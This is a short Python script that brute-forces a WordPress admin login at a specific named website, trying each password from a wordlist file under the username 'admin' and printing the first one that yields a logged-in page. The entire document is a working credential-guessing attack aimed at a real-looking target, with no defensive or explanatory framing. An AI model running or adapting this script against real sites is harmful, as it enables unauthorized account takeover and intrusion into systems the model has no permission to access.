#!/bin/python3
#coding: utf-8

import requests

url = 'http://clique.com.br/admin'
arq = open('dic.txt','r').readlines()

for line in arq:
    password = line.strip()
    http = requests.post(url, data={'log':'admin','pwd':password,'wp-submit':'Login','redirect_to':'/wp-admin/','testcookie':'1'})
    content = http.content
    if b"Logado" in content:
        print("=============== [+] PASSWORD: "+password+" ==========")
        break
    else:
        print("[-] Passowrd invalid: "+password)
